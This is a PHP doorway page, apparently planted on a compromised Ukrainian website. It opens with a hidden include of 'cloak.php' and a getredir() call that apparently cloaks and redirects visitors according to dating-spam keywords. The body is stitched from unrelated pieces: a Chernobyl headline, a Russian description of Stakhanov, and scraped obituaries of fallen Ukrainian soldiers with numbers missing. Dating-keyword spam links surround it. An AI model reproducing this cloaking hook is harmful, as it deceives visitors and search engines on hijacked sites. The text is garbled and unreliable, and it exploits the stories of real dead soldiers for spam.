<?php
if(!@include('cloak.php'))	@include('../cloak.php');
if(function_exists('getredir')){
	@getredir ('api', '%d0%b7%d0%be%d0%bd%d0%b0+%d0%b7%d0%bd%d0%b0%d0%b9%d0%be%d0%bc%d1%81%d1%82%d0%b2+%d0%9a%d0%b0%d0%b4%d1%96%d1%97%d0%b2%d0%ba%d0%b0+%d0%a3%d0%ba%d1%80%d0%b0%d1%97%d0%bd%d0%b0', '2021-05-21', 'pir_210521/UA_dat_geo_trans_ukr', 'ua_dating.txt');
}
?><!doctype html>
<html lang="">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<title>План для Чорнобиля: Знищити "схематоз", економічна зона і півмільйона туристів</title>
	<meta name="description" content="Стаха́нов / Ка́диевка (укр. Кадіївка) — город областного значения в Луганской области Украины. С весны года в составе Луганской Народной Республики. Находится в зоне вооружённого конфликта между Украиной..." />
	<link rel="canonical" href="https://masage.od.ua/img/137/nefu-zona-znayomstv.php" />
<?php if(!@include('../inc1mywp1.php')) @include('inc1mywp1.php'); ?>
						<div id="primary-menu" class="menu"><ul>
<li class="page_item page-item-2"><a href="https://masage.od.ua/img/352/nufit-naykrashe-agentstvo-znayomstv.php">найкраще агентство знайомств Перевальськ Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/237/nafyc-pyatnitsya-ogoloshennya-znayomstva.php">пятниця оголошення знайомства поблизу Знамянка Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/103/nohi-mstsev-sayti-znayomstv.php">місцеві сайти знайомств в Могилів-Подільський Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/211/paw-naykrasha-posluga.php">найкраща послуга знайомств в Бахмач Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/406/tohar-sayti-znayomstv-bezkoshtovno.php">сайти знайомств безкоштовно Боярка Україна</a></li>
</ul></div>
						<div class="main-navigation-bg"></div>
						<div class="clearfix"></div>
					</nav><!-- #site-navigation -->
				</div>
			</div>

		</div>

	</header><!-- #masthead -->



	<div id="content" class="site-content">
	<div class="container"><div class="row"><div class="col-md-7 order-md-3">
	<div id="primary" class="content-area">
		<main id="main" class="site-main main-content-middle">


<article id="post-1" class="post-1 post type-post status-publish format-standard hentry category-uncategorized">
		<header class="entry-header">
		<h1 class="entry-title">Зона знайомств Кадіївка Україна</h1><!-- .entry-meta -->
			</header><!-- .entry-header -->



	<div class="entry-content">

<p>
<p>У роках Золін-молодший проходив строкову службу у житомирській й десантній бригаді. Після демобілізації сидів удома недовго й на початку року підписав контракт та повернувся до 95 одшбр. Згодом перейшов до лав ї механізованої бригади ім. князя Костянтина Острозького. Служив у званні сержанта. Старший стрілець мотопіхотної роти мотопіхотного батальйону 30 омбр. Загинув чоловік увечері 19 березня в районі Новоолександрівки Попаснянського району на Луганщині. Сержант Золін ніс бойове чергування на ВОПі, коли отримав поранення від снайперського пострілу в голову.</p>
<p>Поховали воїна на Смолянському військовому кладовищі Житомира. В останню путь полеглого проводжали близько сотні людей, військовий оркестр, численні товариші по службі, почесна варта. Поховали Олексія з усіма військовими почестями. Фатальною для молошого сержанта стала куля ворожого снайпера. Володимирові Сергійовичу було  Він народився 11 вересня року, мешканець села Андрушівка Погребищенського району Вінницької області. Служив у ЗСУ з травня року.</p>
		
			<br><ol>
			
				<li>Содержание;</li>
			
				<li>район затоки знайомств в Очаків Україна.</li>
			
				<li>2. Сергій Рацун!</li>
			
				<li>домашні швидкісні побачення Вишневе Україна.</li>
			
			</ol>
		
	<p>Відтоді двічі продовжував контракт. Посада — навідник СПГ станкового протитанкового гранатомета. Негативу за ним жодного. Ворог прийшов до нас зі зброєю і буде знищений. Від рук ворогів України, окупантів, які хочуть зняття санкцій і жити так, якби і нічого не було, в зоні проведення бойових дій загинув офіцер Олександр Маланчук — випускник Національної академії сухопутних військ, який проходив службу у й окремій гірсько-штурмовій бригаді. Згадаймо про нього у молитві!!! Начальник НАСВ ім.</p>
<p>Батько Василь Миколайович Маланчук — полковник, до року був першим заступником комісара Чернівецького обласного військомату. Також представляв Академію сухопутних військ на спортивних змаганнях. Олексій Купріков народився 13 січня року в Росії, у Читинській області. Жив у селищі Черкаське Новомосковського району на Дніпропетровщині, де дислокується 93 омбр.</p>
<p>Отримав середню технічну освіту. Олексій вирішив піти на війну, після того як на фронті загинув його друг. Контракт із ЗСУ підписав у листопаді року. Хоча спершу чоловік проходив службу на посаді стрільця-помічника гранатометника, а вже потім, після навчання у навчальному центрі, здобув новий фах. Льоша ж, навпаки, навіть якщо чогось і не знав, ґрунтовно та розсудливо намагався зрозуміти у деталях, як що працює, як краще полагодити техніку. І в нього це дуже добре виходило. Був спокійний, розважливий, зацікавлений у своїй роботі.</p><img src="https://image.isu.pub/180831185644-7c729f57b391941f5bedb5cb1cf6cf6b/jpg/page_1.jpg" alt="1. Сергій Дичек" style="max-width: 480px; max-height: 480px;"/><p>Олексій воював у районі Авдіївки, Новоселівки Другої, в останню ротацію — на околицях Кримського на Луганщині. Там, під час обстрілу позиції 93 омбр біля Кримського, і загинув 9 квітня, зазнавши множинних осколкових поранень.</p><strong><a id='u1'></a><h2>Усі загиблі на Донбасі року: згадаймо їхні імена й обличчя | Новинарня</h2></strong><p>Напередодні загибелі Лєший розмовляв по телефону із сином. Невдовзі мав приїхати додому у відпустку…. Поховали солдата в смт Черкаське, поруч із батьком. Залишилися цивільна дружина, річний син Владислав, мама та рідна сестра, яка також служить у й бригаді. Леонід Скакуненко не дожив десять днів до свого ліття. У році, після початку війни, був мобілізований до лав Національної гвардії. А згодом повернувся на війну вже у Збройних силах, з якими підписав контракт. Брав участь бойових діях у Новотроїцькому, Новоселівці Другій, на околицях Кримського.</p>
<p>У Вербну неділю, 12 квітня, окупанти обстріляли позиції ОС поблизу Кримського на Луганщині з ручних протитанкових гранатометів.</p><strong><a id='u2'></a><h2>Усі загиблі на Донбасі 2021 року: згадаймо їхні імена й обличчя</h2></strong><p>Леонід, який саме перебував на бойовому чергуванні, отримав поранення, несумісні з життям…. Коли почалися бойові дії на сході року, Андрій був у першій хвилі мобілізованих. Тож пішов навчатися в Національну академію Сухопутних військ ім. На війну Андрій повернувся офіцером. Лейтенант, командир механізованого взводу ї окремої механізованої бригади імені Лицарів Зимового походу. Особовий склад, його підлеглі говорять, що Андрій був хорошим командиром, чув, розумів людей.</p><strong><a id='u3'></a><h2>Стаханов (город)</h2></strong><p>Дуже тепло про нього відгукуються. Але здійснити їх не судилося. Осколками йому посікло правий бік. Там множинні осколкові поранення. Їх дуже багато було, вони виявилися несумісні з життям. Поховали лейтенанта в Любомлі.</p>
		
	<p>По українських позиціях у районі Жолобок-Кримське на Луганщині ворог ударив з СПГ та важкої артилерії калібрів й мм. Олексій — родом із села Гірке Гуляйпільського району, що в Запоріжжі. Народився 30 березня року. Приєднався до ї бригади у му, коли підрозділ стояв на Авдіївському напрямку на Донеччині.</p>
<p>Служив на посаді водія в механізованому батальйоні. В Олексія лишилися річна донька від першого шлюбу Ліда, кохана дівчина Ліля, з якою він планував одружитись, старенька бабуся, молодший брат Микола, старша сестра Тетяна. Олександр народився 25 березня року в Старобільську на Луганщині. Згодом родина переїхала у Вінницьку область, в село Буди Тростянецького району.</p>
<p>Як розповідають сусіди, Карпики живуть дуже скромно, і Сашко мріяв заробити, щоб купити рідним просторий будинок. Після школи хлопець закінчив Немирівський професійний ліцей, здобув фах електрогазозварювальника. А коли навесні го прийшла повістка на строкову службу, вирішив одразу підписати контракт із ЗСУ. Казав, що мріє в майбутньому стати офіцером. Через три роки — підписав контракт удруге. Старший солдат, хімік відділення радіаційного, хімічного, біологічного захисту го окремого полку оперативного призначення. Близько у нього поцілив ворожий снайпер. Куля влучила під бронежилет, пошкодивши великі кровоносні судини.</p>
<p>Медики Старобільської лікарні боролися за Сашкове життя ще кілька годин. На жаль, після тригодинної операції смерть виявилася сильнішою.</p><a id='u4'></a><h3>Навігаційне меню</h3><p>Про полковника поліції Сергія Губанова можна розповідати дуже довго. Це була справді непересічна людина. Хотів служити строкову у ВДВ, але зрештою потрапив у ту окрему аеромобільну бригаду. А після демобілізації пішов у правоохоронні органи. Починаючи з року, він пройшов шлях від оперативника карного розшуку Стахановської міського відділу міліції до начальника Луганського міського управління. Паралельно закінчив спершу Донецький інститут внутрішніх справ, а потім — Національну академію ВС у Києві. Події року застали його на посаді начальника Ленінського районного відділу міліції Луганська.</p>
<p>Усвідомлюючи, до чого все йде, Губанов встиг вивезти з відділку всю зброю й разом із колегами заховати її в надійних місцях. Тоді Губанова вдалося витягти. Але після цього він тиждень ходив на роботу з гранатою в барсетці — вдруге в полон потрапляти не збирався. Знаючи авторитет Губанова, московські куратори луганських бойовиків доклали багато зусиль, щоб завербувати його на свій бік. Довелося терміново кидати дім, роботу, і вибиратися з міста.</p>
		
	<p>Відтоді вони більше не спілкувалися. Разом із ним звільняв Лисичанськ, інші населені пункти Луганщини. Жив у казармі зі своїми бійцями, там же і їв, і спав.</p>
		
	
</p>
	</div><!-- .entry-content -->

</article><!-- #post-1 -->


		</main><!-- #main -->
	</div><!-- #primary -->


	</div><div class="col-md-2 order-md-1">

	<aside id="secondary" class="widget-area">
			</aside><!-- #secondary -->
</div><div class="col-md-3 order-md-10">
	<aside id="secondary" class="widget-area">
		<section id="search-2" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://masage.od.ua/img/211/wiqyf-vikonavch-poslugi.php">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form></section>		<section id="recent-posts-2" class="widget widget_recent_entries">		<h2 class="widget-title">Recent Posts</h2>		<ul>
											<li><a href="https://masage.od.ua/img/247/cof-znayomstva-z-cholovkom.php">знайомства з чоловіком з Кілія Україна</a></li><li><a href="https://masage.od.ua/img/428/coder-znayomstva-na-bershad.php">знайомства на Бершадь Україна</a></li><li><a href="https://masage.od.ua/img/398/xeku-msto-znayomstva.php">місто знайомства поблизу Лиман Україна</a></li><li><a href="https://masage.od.ua/img/313/jusa-svat-znayomstva.php">сват знайомства Броди Україна</a></li><li><a href="https://masage.od.ua/img/280/no-naykrash-programi-dlya.php">найкращі програми для знайомств в Інтернеті - Алушта Україна</a></li><li><a href="https://masage.od.ua/img/313/tocez-naykrashe-mstse-dlya.php">найкраще місце для підключення Верхівцеве Україна</a></li>
					</ul>
		</section>

			<section id="meta-2" class="widget widget_meta"><h2 class="widget-title">Contents</h2>
				<ol><li><a href='#u1'>Усі загиблі на Донбасі року: згадаймо їхні імена й обличчя | Новинарня</a></li>
<li><a href='#u2'>Усі загиблі на Донбасі 2021 року: згадаймо їхні імена й обличчя</a></li>
<li><a href='#u3'>Стаханов (город)</a></li>
<li><a href='#u4'>Навігаційне меню</a></li>
</ol>
			</section>

	</aside><!-- #secondary -->
</div></div></div>	</div>
	<footer id="colophon" class="site-footer">

		<div class="covf-footer-copyright">
			<div class="container">
				<div class="row">
					<div class="col">
						<div class="site-info text-center">
							Powered by 	<a href="https://masage.od.ua/img/327/va-znayomstva-msto-msto.php">Covfefe WordPress Theme</a>
						</div>
					</div>
				</div>
			</div>
		</div>
	</footer><!-- #colophon -->
</div><!-- #page -->

<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/jquery.marquee.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/scripts.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/comment-reply.min.js?ver=5.0.3'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/wp-embed.min.js?ver=5.0.3'></script>

</body>
</html>